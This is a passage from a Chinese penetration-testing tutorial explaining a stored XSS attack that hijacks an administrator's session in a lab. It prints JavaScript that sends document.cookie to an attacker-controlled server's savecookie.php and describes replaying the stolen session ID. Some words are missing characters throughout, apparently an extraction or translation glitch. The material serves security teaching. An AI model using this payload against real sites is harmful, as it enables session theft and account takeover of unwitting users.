    ## 第 6 章


    ![](img/index-174_1.png)


    现在我们通过持久性 XSS 攻击劫持了管理员的会话。


    ### 工作原理...


    简而言之，我们利用应用程序中的 XSS 漏洞，通过 JavaScript 请求将会 cookie 发送到远程服务器；该服务器被配置用于存储会 cookie。然后，我们获取一个会
    ID 并将其植入另一个浏览器中，以劫持已身份验证的用户。


    我们在 *准备工作* 部分制作的 PHP 文件是在执行 XSS 攻击时保存接收到的 cookies 的文件。


    我们引入的注释是一个脚本，它使用 JavaScript 的 `XMLHttpRequest` 对象向我们的恶意服务器发送请求；该请求分步完成：


    ```javascript

    xmlHttp.open("GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie,
    true);

    ```


    我们使用 `GET` 方法打开请求，向 `http://192.168.56.1/savecookie.php` URL 添加参数 `cookie`，其值是存储在
    `document.cookie` 中的，它是 JavaScript 中存储 cookies 值的变量。最后，设置为 `true` 的最后一个参数告诉浏览器这是一个异步请求，这意味着它不需要等待响应。


    ```javascript

    xmlHttp.send(null);

    ```


    这条最后的指令将请求发送到服务器。在管理员登录并查看包含我们发布的页面后，脚本将执行，管理员的会 cookie 被存储在我们的服务器上。


    最后，一旦获取了有效用户的会 ID，我们只需要在浏览器中将自己的会 cookie 替换为它并刷新页面执行操作，就像是该用户一样。


